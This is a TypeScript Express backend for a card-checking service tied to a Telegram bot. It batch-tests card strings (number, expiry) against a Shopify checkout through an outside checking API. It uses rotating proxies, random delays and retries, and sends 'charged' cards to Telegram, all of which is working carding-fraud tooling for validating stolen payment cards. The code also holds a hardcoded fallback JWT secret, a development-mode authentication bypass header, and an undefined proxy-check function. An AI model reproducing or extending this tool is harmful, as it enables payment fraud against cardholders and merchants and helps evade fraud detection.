import type { Express, Request, Response, NextFunction } from "express";
import { type Server } from "http";
import { WebSocketServer, WebSocket } from "ws";
import { storage } from "./storage";
import { api } from "@shared/routes";
import { WS_EVENTS, ADMIN_TELEGRAM_ID } from "@shared/schema";
import { selectAPI, buildCheckUrl } from "./api-config";
const CHECK_API_URL = process.env.CHECK_API_URL || 'https://apicleen-production-d7b1.up.railway.app/api/check';
import jwt from "jsonwebtoken";
import { telegramService } from "./services/telegram";
import { handleBotUpdate, initBot, sendChargedCardNotification } from "./services/telegramBot";
import { setWss } from "./services/wsManager";
import { searchTracks as spotifySearch, getAccessTokenForClient, playTrack as spotifyPlayTrack } from "./services/spotify";
import { generateCaptcha, verifyCaptcha } from "./captcha";

const JWT_SECRET = process.env.SESSION_SECRET || 'nexus-checker-secret-key-2025';

interface AuthRequest extends Request {
  user?: {
    id: number;
    telegramId: string;
    isAdmin: boolean;
    credits: number;
  };
}

interface UserWebSocket extends WebSocket {
  userId?: number;
  telegramId?: string;
  isAlive?: boolean;
}

export async function registerRoutes(
  httpServer: Server,
  app: Express
): Promise<Server> {

  const wss = new WebSocketServer({ server: httpServer, path: '/ws' });
  setWss(wss);

  const broadcastAll = (data: any) => {
    const payload = JSON.stringify(data);
    wss.clients.forEach((client) => {
      if (client.readyState === WebSocket.OPEN) {
        client.send(payload);
      }
    });
  };

  const broadcastToUser = (userId: number | string, data: any) => {
    const payload = JSON.stringify(data);
    wss.clients.forEach((client) => {
      const userClient = client as UserWebSocket;
      if (userClient.readyState === WebSocket.OPEN) {
        if (userClient.userId === userId || userClient.telegramId === String(userId)) {
          userClient.send(payload);
        }
      }
    });
  };

  wss.on('connection', (ws: UserWebSocket, req) => {
    ws.isAlive = true;
    
    ws.on('pong', () => {
      ws.isAlive = true;
    });

    ws.on('message', async (message) => {
      try {
        const data = JSON.parse(message.toString());
        if (data.type === 'auth' && data.token) {
          const decoded = jwt.verify(data.token, JWT_SECRET) as { telegramId: string; userId: number };
          ws.telegramId = decoded.telegramId;
          ws.userId = decoded.userId;
          ws.send(JSON.stringify({ type: 'auth_success' }));
        }
      } catch (e) {
        // Ignore
      }
    });
  });

  setInterval(() => {
    wss.clients.forEach((ws) => {
      const client = ws as UserWebSocket;
      if (!client.isAlive) {
        return client.terminate();
      }
      client.isAlive = false;
      client.ping();
    });
  }, 30000);

  const getOnlineUsers = async () => {
    const onlineList: Array<{ telegramId: string; userId: number; username: string | null; firstName: string | null; photoUrl: string | null; isAdmin: boolean }> = [];
    const seenIds = new Set<string>();
    const ADMIN_ID = process.env.TELEGRAM_ADMIN_ID || '5197976453';
    
    const clients = Array.from(wss.clients) as UserWebSocket[];
    for (const userClient of clients) {
      if (userClient.readyState === WebSocket.OPEN && userClient.telegramId && !seenIds.has(userClient.telegramId)) {
        seenIds.add(userClient.telegramId);
        const user = await storage.getUserByTelegramId(userClient.telegramId);
        if (user) {
          onlineList.push({
            telegramId: userClient.telegramId,
            userId: user.id,
            username: user.username,
            firstName: user.firstName,
            photoUrl: user.photoUrl,
            isAdmin: userClient.telegramId === ADMIN_ID,
          });
        }
      }
    }
    return onlineList.sort((a, b) => (b.isAdmin ? 1 : 0) - (a.isAdmin ? 1 : 0));
  };

  interface UserJob {
    isRunning: boolean;
    shouldStop: boolean;
    sessionId: string | null;
    processed: number;
    total: number;
    charged: number;
    rejected: number;
  }
  
  const userJobs = new Map<number, UserJob>();
  
  const getUserJob = (userId: number): UserJob => {
    if (!userJobs.has(userId)) {
      userJobs.set(userId, {
        isRunning: false,
        shouldStop: false,
        sessionId: null,
        processed: 0,
        total: 0,
        charged: 0,
        rejected: 0,
      });
    }
    return userJobs.get(userId)!;
  };

  const killUserProcesses = (userId: number) => {
    const job = getUserJob(userId);
    job.shouldStop = true;
    job.isRunning = false;
    job.sessionId = null;
    job.processed = 0;
    job.total = 0;
    job.charged = 0;
    job.rejected = 0;
  };

  const checkCardWithAPI = async (card: string, siteUrl: string, proxy: string, onLog: (msg: string) => void): Promise<{status: string, message: string, price?: string, gateway?: string}> => {
    const cardPrefix = card.substring(0, 6);
    onLog(`Checking card ${cardPrefix}...`);

    try {
      // Select API based on proxy usage
      const hasProxy = proxy && proxy.trim().length > 0;
      const selectedAPI = selectAPI(hasProxy);
      onLog(`Using API: ${selectedAPI.substring(0, 50)}...`);
      
      // Build URL with proper site protocol
      const url = buildCheckUrl(selectedAPI, card, siteUrl, proxy);
      onLog(`Request: ${url.substring(0, 100)}...`);

      const response = await fetch(url, {
        signal: AbortSignal.timeout(120000),
      });

      if (!response.ok) {
        onLog(`API returned status ${response.status}`);
        return { status: 'error', message: `API Error: ${response.status}` };
      }

      const data = await response.json() as any;
      onLog(`Response: ${JSON.stringify(data).substring(0, 100)}...`);

      const apiStatus = (data.Status || '').toLowerCase();
      const apiResponse = data.Response || data.Status || 'Unknown';

      let status = 'dead';
      if (apiStatus === 'approved' || apiStatus === 'live') {
        status = 'live';
      }

      return {
        status,
        message: apiResponse,
        price: data.Price,
        gateway: data.Gateway,
      };
    } catch (e: any) {
      if (e.name === 'AbortError' || e.name === 'TimeoutError') {
        return { status: 'error', message: 'Timeout' };
      }
      return { status: 'error', message: e.message || 'API Error' };
    }
  };

  const isCardExpired = (cardStr: string): boolean => {
    const parts = cardStr.split('|');
    if (parts.length < 3) return false;
    
    let month = parseInt(parts[1], 10);
    let year = parseInt(parts[2], 10);
    
    if (isNaN(month) || isNaN(year)) return false;
    
    if (year < 100) {
      year += 2000;
    }
    
    const now = new Date();
    const currentYear = now.getFullYear();
    const currentMonth = now.getMonth() + 1;
    
    if (year < currentYear) return true;
    if (year === currentYear && month < currentMonth) return true;
    
    return false;
  };

  const processQueue = async (cards: string[], targetUrl: string, proxyListStr: string, userId: number, telegramId: string, sessionId: string, siteId?: number) => {
    const job = getUserJob(userId);
    job.isRunning = true;
    job.shouldStop = false;
    job.sessionId = sessionId;
    job.processed = 0;
    job.total = cards.length;
    job.charged = 0;
    job.rejected = 0;

    const proxies = proxyListStr.split('\n')
      .map(p => p.trim())
      .filter(p => p.length > 0);

    let processedCount = 0;
    let chargedCount = 0;
    let rejectedCount = 0;

    const allCards = cards
      .map(c => c.trim())
      .filter(c => c && c.includes('|'));

    for (let i = allCards.length - 1; i > 0; i--) {
      const j = Math.floor(Math.random() * (i + 1));
      [allCards[i], allCards[j]] = [allCards[j], allCards[i]];
    }

    const BATCH_SIZE = Math.min(Math.max(Math.ceil(allCards.length / 5), 1), 10);

    broadcastToUser(userId, { type: WS_EVENTS.STATUS_UPDATE, payload: { active: true, processed: 0, total: allCards.length } });
    broadcastToUser(userId, { type: WS_EVENTS.LOG, payload: { message: `Starting check on ${targetUrl}...`, type: 'info' } });
    broadcastToUser(userId, { type: WS_EVENTS.LOG, payload: { message: `${allCards.length} cards | ${proxies.length} proxies | Parallel: ${BATCH_SIZE}`, type: 'info' } });

    for (let i = 0; i < allCards.length; i += BATCH_SIZE) {
      if (job.shouldStop) {
        broadcastToUser(userId, { type: WS_EVENTS.LOG, payload: { message: 'Stopped by user', type: 'info' } });
        break;
      }

      const batch = allCards.slice(i, i + BATCH_SIZE);
      const batchNum = Math.floor(i / BATCH_SIZE) + 1;
      const totalBatches = Math.ceil(allCards.length / BATCH_SIZE);
      
      broadcastToUser(userId, { type: WS_EVENTS.LOG, payload: { message: `Batch ${batchNum}/${totalBatches}...`, type: 'info' } });

      const batchPromises = batch.map(async (cardStr, idx) => {
        if (job.shouldStop) {
          return { success: false, stopped: true, charged: false };
        }

        if (idx > 0) {
          const delay = 500 + Math.random() * 1000;
          await new Promise(r => setTimeout(r, delay));
        }

        const proxyIndex = (i + idx) % (proxies.length || 1);
        const currentProxy = proxies[proxyIndex] || '';

        if (isCardExpired(cardStr)) {
          const saved = await storage.addResult({
            card: cardStr,
            status: 'dead',
            message: 'Expired Card',
            userId: userId,
            sessionId: sessionId,
          });
          
          broadcastToUser(userId, { type: WS_EVENTS.RESULT, payload: saved });
          await storage.updateUserStats(telegramId, 0, 1);
          return { success: true, stopped: false, charged: false };
        }

        // Process valid card with API
        try {
          let result = await checkCardWithAPI(cardStr, targetUrl, currentProxy, (msg) => {
            if (job.shouldStop) return;
            broadcastToUser(userId, { type: WS_EVENTS.LOG, payload: { message: `[${cardStr.substring(0, 6)}] ${msg}`, type: 'info' } });
          });
          
          // Retry once if error (use different proxy if available)
          if (result.status === 'error' && !job.shouldStop) {
            const retryProxyIndex = (proxyIndex + 1) % (proxies.length || 1);
            const retryProxy = proxies[retryProxyIndex] || currentProxy;
            broadcastToUser(userId, { type: WS_EVENTS.LOG, payload: { message: `[${cardStr.substring(0, 6)}] Error - Retrying with new proxy...`, type: 'info' } });
            
            await new Promise(r => setTimeout(r, 2000));
            result = await checkCardWithAPI(cardStr, targetUrl, retryProxy, (msg) => {
              if (job.shouldStop) return;
              broadcastToUser(userId, { type: WS_EVENTS.LOG, payload: { message: `[${cardStr.substring(0, 6)}] ${msg}`, type: 'info' } });
            });
          }
          
          if (job.shouldStop || result.message?.includes('[STOPPED]')) {
            return { success: false, stopped: true, charged: false };
          }
          
          let status = 'unknown';
          let isCharged = false;
          
          if (result.status === 'live') {
            status = 'live';
            isCharged = true;
          } else if (result.status === 'dead' || result.status === 'error') {
            status = 'dead';
          }

          const saved = await storage.addResult({
            card: cardStr,
            status: status,
            message: result.message || 'No message',
            userId: userId,
            sessionId: sessionId,
          });

          broadcastToUser(userId, { type: WS_EVENTS.RESULT, payload: saved });

          const currentUser = await storage.getUserByTelegramId(telegramId);
          if (currentUser && !currentUser.isAdmin) {
            const updatedUser = await storage.updateUserCredits(telegramId, -1);
            if (updatedUser) {
              broadcastToUser(userId, { type: WS_EVENTS.CREDITS_UPDATE, payload: { credits: updatedUser.credits } });
            }
          }

          if (result.price && siteId) {
            await storage.updateSitePrice(siteId, result.price);
          }

          if (isCharged) {
            const siteName = siteId 
              ? (await storage.getSiteById(siteId))?.name || targetUrl 
              : targetUrl;
            
            sendChargedCardNotification(telegramId, cardStr, siteName, result.message || 'Charged', {
              brand: result.gateway || 'Unknown',
              type: 'CREDIT',
              country: 'US',
              countryCode: 'US'
            }).catch(console.error);
          }

          return { success: true, stopped: false, charged: isCharged };
        } catch (e: any) {
          if (!job.shouldStop) {
            broadcastToUser(userId, { type: WS_EVENTS.LOG, payload: { message: `Error [${cardStr.substring(0, 6)}]: ${e.message}`, type: 'error' } });
          }
          return { success: false, stopped: job.shouldStop, charged: false };
        }
      });

      const batchResults = await Promise.all(batchPromises);
      
      const actuallyProcessed = batchResults.filter(r => !r.stopped).length;
      const batchCharged = batchResults.filter(r => r.charged).length;
      const batchRejected = actuallyProcessed - batchCharged;
      
      processedCount += actuallyProcessed;
      chargedCount += batchCharged;
      rejectedCount += batchRejected;
      
      job.processed = processedCount;
      job.charged = chargedCount;
      job.rejected = rejectedCount;
      
      if (!job.shouldStop) {
        broadcastToUser(userId, { type: WS_EVENTS.STATUS_UPDATE, payload: { 
          active: true, 
          processed: processedCount, 
          total: allCards.length,
          charged: chargedCount,
          rejected: rejectedCount 
        }});
      }
    }

    await storage.updateUserStats(telegramId, chargedCount, rejectedCount);

    job.isRunning = false;
    job.sessionId = null;
    
    if (!job.shouldStop) {
      broadcastToUser(userId, { type: WS_EVENTS.STATUS_UPDATE, payload: { 
        active: false, 
        processed: processedCount, 
        total: allCards.length,
        charged: chargedCount,
        rejected: rejectedCount
      }});
      broadcastToUser(userId, { type: WS_EVENTS.LOG, payload: { message: `✅ Finished! ${processedCount}/${allCards.length} | Charged: ${chargedCount} | Declined: ${rejectedCount}`, type: 'info' } });
    }
  };

  const authMiddleware = async (req: AuthRequest, res: Response, next: NextFunction) => {
    const authHeader = req.headers['authorization'] as string;
    if (authHeader?.startsWith('Bearer ')) {
      try {
        const token = authHeader.substring(7);
        const decoded = jwt.verify(token, JWT_SECRET) as { telegramId: string; userId: number };
        const user = await storage.getUserByTelegramId(decoded.telegramId);
        if (user) {
          req.user = {
            id: user.id,
            telegramId: user.telegramId,
            isAdmin: user.isAdmin,
            credits: user.credits,
          };
          return next();
        }
      } catch (e) {
        // Token invalid
      }
    }
    
    if (process.env.NODE_ENV === 'development') {
      const telegramId = req.headers['x-telegram-id'] as string;
      if (telegramId) {
        const user = await storage.getUserByTelegramId(telegramId);
        if (user) {
          req.user = {
            id: user.id,
            telegramId: user.telegramId,
            isAdmin: user.isAdmin,
            credits: user.credits,
          };
          return next();
        }
      }
    }
    
    return res.status(401).json({ error: 'Unauthorized' });
  };

  app.post(api.auth.login.path, async (req, res) => {
    try {
      const { initData } = req.body;
      const result = await telegramService.authenticateUser(initData);
      
      if (!result.success || !result.user) {
        return res.status(401).json({ error: result.error });
      }
      
      const token = jwt.sign(
        { telegramId: result.user.telegramId, userId: result.user.id },
        JWT_SECRET,
        { expiresIn: '7d' }
      );
      
      res.json({ user: result.user, token });
    } catch (e: any) {
      res.status(500).json({ error: e.message });
    }
  });

  app.get(api.auth.me.path, authMiddleware, async (req: AuthRequest, res) => {
    const user = await storage.getUserByTelegramId(req.user!.telegramId);
    res.json({ user });
  });

  app.get(api.sites.list.path, authMiddleware, async (req: AuthRequest, res) => {
    const sites = await storage.getUserSites(req.user!.id);
    res.json(sites);
  });

  app.post(api.sites.add.path, authMiddleware, async (req: AuthRequest, res) => {
    try {
      const { name, url } = req.body;
      const site = await storage.addSite({
        userId: req.user!.id,
        name,
        url,
        isActive: false,
      });
      res.json(site);
    } catch (e: any) {
      res.status(400).json({ error: e.message });
    }
  });

  app.put('/api/sites/:id', authMiddleware, async (req: AuthRequest, res) => {
    try {
      const id = parseInt(req.params.id as string);
      const userSites = await storage.getUserSites(req.user!.id);
      const ownsSite = userSites.some(s => s.id === id);
      if (!ownsSite) {
        return res.status(403).json({ error: 'Access denied' });
      }
      const { name, url } = req.body;
      const site = await storage.updateSite(id, { name, url });
      res.json(site);
    } catch (e: any) {
      res.status(400).json({ error: e.message });
    }
  });

  app.delete('/api/sites/:id', authMiddleware, async (req: AuthRequest, res) => {
    try {
      const id = parseInt(req.params.id as string);
      const userSites = await storage.getUserSites(req.user!.id);
      const ownsSite = userSites.some(s => s.id === id);
      if (!ownsSite) {
        return res.status(403).json({ error: 'Access denied' });
      }
      await storage.deleteSite(id);
      res.json({ success: true });
    } catch (e: any) {
      res.status(400).json({ error: e.message });
    }
  });

  app.post('/api/sites/:id/activate', authMiddleware, async (req: AuthRequest, res) => {
    try {
      const siteId = parseInt(req.params.id as string);
      const userSites = await storage.getUserSites(req.user!.id);
      const ownsSite = userSites.some(s => s.id === siteId);
      if (!ownsSite) {
        return res.status(403).json({ error: 'Access denied' });
      }
      await storage.setActiveSite(req.user!.id, siteId);
      const site = await storage.getActiveSite(req.user!.id);
      res.json(site);
    } catch (e: any) {
      res.status(400).json({ error: e.message });
    }
  });

  app.get(api.proxies.list.path, authMiddleware, async (req: AuthRequest, res) => {
    const proxies = await storage.getUserProxies(req.user!.id);
    res.json(proxies);
  });

  app.post(api.proxies.add.path, authMiddleware, async (req: AuthRequest, res) => {
    try {
      const { proxies: proxyList } = req.body;
      const added = [];
      for (const proxy of proxyList) {
        if (proxy.trim()) {
          const p = await storage.addProxy({
            userId: req.user!.id,
            proxy: proxy.trim(),
            isValid: true,
          });
          added.push(p);
        }
      }
      res.json(added);
    } catch (e: any) {
      res.status(400).json({ error: e.message });
    }
  });

  app.post(api.proxies.validate.path, async (req, res) => {
    try {
      const { proxy } = req.body;
      const parts = proxy.split(':');
      const isValid = parts.length >= 2;
      res.json({ isValid });
    } catch (e: any) {
      res.status(400).json({ error: e.message });
    }
  });

  app.post('/api/proxies/test', authMiddleware, async (req: AuthRequest, res) => {
    try {
      const { proxy } = req.body;
      console.log('[API] Testing proxy:', proxy);
      
      // فحص الـ proxy بشكل حقيقي
      const result = await checkProxyValidity(proxy, 10000);
      
      console.log('[API] Result:', result);
      
      res.json({ 
        isValid: result.isValid,
        latency: result.latency,
        error: result.error,
        type: result.type
      });
    } catch (e: any) {
      console.error('[API] Error:', e);
      res.status(400).json({ error: e.message });
    }
  });

  app.delete('/api/proxies/:id', authMiddleware, async (req: AuthRequest, res) => {
    try {
      const id = parseInt(req.params.id as string);
      const userProxies = await storage.getUserProxies(req.user!.id);
      const ownsProxy = userProxies.some(p => p.id === id);
      if (!ownsProxy) {
        return res.status(403).json({ error: 'Access denied' });
      }
      await storage.deleteProxy(id);
      res.json({ success: true });
    } catch (e: any) {
      res.status(400).json({ error: e.message });
    }
  });

  app.delete(api.proxies.clear.path, authMiddleware, async (req: AuthRequest, res) => {
    try {
      await storage.deleteAllUserProxies(req.user!.id);
      res.json({ success: true });
    } catch (e: any) {
      res.status(400).json({ error: e.message });
    }
  });

  app.post('/api/tutorial/complete', authMiddleware, async (req: AuthRequest, res) => {
    try {
      await storage.markTutorialSeen(req.user!.telegramId);
      res.json({ success: true });
    } catch (e: any) {
      res.status(400).json({ error: e.message });
    }
  });

  app.get(api.credits.balance.path, authMiddleware, async (req: AuthRequest, res) => {
    const user = await storage.getUserByTelegramId(req.user!.telegramId);
    if (!user) {
      return res.status(404).json({ error: 'User not found' });
    }
    res.json({ credits: user.credits });
  });

  app.post(api.credits.add.path, authMiddleware, async (req: AuthRequest, res) => {
    if (!req.user!.isAdmin) {
      return res.status(403).json({ error: 'Admin only' });
    }
    
    try {
      const { telegramId, amount } = req.body;
      const user = await storage.updateUserCredits(telegramId, amount);
      if (!user) {
        return res.status(404).json({ error: 'User not found' });
      }
      
      await storage.addCreditTransaction(user.id, amount, 'admin_add', `Added by admin`, req.user!.telegramId);
      res.json(user);
    } catch (e: any) {
      res.status(400).json({ error: e.message });
    }
  });

  app.get(api.credits.history.path, authMiddleware, async (req: AuthRequest, res) => {
    const user = await storage.getUserByTelegramId(req.user!.telegramId);
    if (!user) {
      return res.status(404).json({ error: 'User not found' });
    }
    
    const history = await storage.getCreditTransactions(user.id);
    res.json(history);
  });

  app.get(api.settings.get.path, authMiddleware, async (req: AuthRequest, res) => {
    try {
      const settings = await storage.getSettings();
      res.json(settings);
    } catch (e: any) {
      res.status(500).json({ error: e.message });
    }
  });

  app.post(api.settings.update.path, authMiddleware, async (req: AuthRequest, res) => {
    if (!req.user!.isAdmin) {
      return res.status(403).json({ error: 'Admin only' });
    }
    
    try {
      const settings = await storage.updateSettings(req.body);
      res.json(settings);
    } catch (e: any) {
      res.status(400).json({ error: e.message });
    }
  });

  app.post(api.check.start.path, authMiddleware, async (req: AuthRequest, res) => {
    try {
      const { cards, siteId } = req.body;
      const cardList = cards;
      const targetUrl = 'https://shopify-checkout.com'; // Default checkout URL
      const proxyList = ''; // Empty by default, user can add proxies in settings
      const sessionId = `session_${Date.now()}_${Math.random().toString(36).substring(7)}`;
      
      const session = await storage.createCheckSession({
        sessionId,
        userId: req.user!.id,
        siteId,
        totalCards: cardList?.length || 0,
      });

      processQueue(cardList || [], targetUrl, proxyList || '', req.user!.id, req.user!.telegramId, sessionId, siteId).catch(console.error);

      res.json(session);
    } catch (e: any) {
      res.status(400).json({ error: e.message });
    }
  });

  app.post(api.check.stop.path, authMiddleware, async (req: AuthRequest, res) => {
    try {
      killUserProcesses(req.user!.id);
      res.json({ success: true });
    } catch (e: any) {
      res.status(400).json({ error: e.message });
    }
  });

  app.post(api.check.clear.path, authMiddleware, async (req: AuthRequest, res) => {
    try {
      await storage.clearResults(req.user!.id);
      res.json({ success: true });
    } catch (e: any) {
      res.status(400).json({ error: e.message });
    }
  });

  app.get('/api/stats', authMiddleware, async (req: AuthRequest, res) => {
    const user = await storage.getUserByTelegramId(req.user!.telegramId);
    if (!user) {
      return res.status(404).json({ error: 'User not found' });
    }
    res.json({
      totalCharged: user.totalCharged,
      totalRejected: user.totalRejected,
      credits: user.credits,
    });
  });

  app.get('/api/stats/global', authMiddleware, async (req: AuthRequest, res) => {
    try {
      const globalStats = await storage.getGlobalStats();
      res.json(globalStats);
    } catch (e: any) {
      res.status(500).json({ error: e.message });
    }
  });

  app.get(api.results.list.path, authMiddleware, async (req: AuthRequest, res) => {
    const results = await storage.getResults(100, req.user!.id);
    res.json(results);
  });

  app.delete(api.results.clear.path, authMiddleware, async (req: AuthRequest, res) => {
    try {
      await storage.clearResults(req.user!.id);
      res.json({ success: true });
    } catch (e: any) {
      res.status(400).json({ error: e.message });
    }
  });

  // Telegram webhook - accepts both GET (for verification) and POST (for updates)
  app.get('/api/telegram/webhook', (req, res) => {
    console.log('[BOT] Webhook GET request received - verification from Telegram');
    res.json({ ok: true, status: 'webhook_ready' });
  });

  app.post('/api/telegram/webhook', async (req, res) => {
    try {
      const update = req.body;
      await handleBotUpdate(update);
      res.json({ ok: true });
    } catch (e: any) {
      res.status(400).json({ error: e.message });
    }
  });

  app.get('/health', (req, res) => {
    res.json({ status: 'ok' });
  });

  // Captcha endpoints
  app.get('/api/captcha', (req, res) => {
    try {
      const captcha = generateCaptcha();
      // Generate simple image by returning the numbers
      // The frontend will create a canvas-based image from these
      res.json({
        id: captcha.id,
        numbers: captcha.numbers
      });
    } catch (e: any) {
      res.status(500).json({ error: e.message });
    }
  });

  app.post('/api/captcha/verify', (req, res) => {
    try {
      const { id, answer } = req.body;
      const isValid = verifyCaptcha(id, answer);
      res.json({ valid: isValid });
    } catch (e: any) {
      res.status(500).json({ error: e.message });
    }
  });

  initBot();

  return httpServer;
}

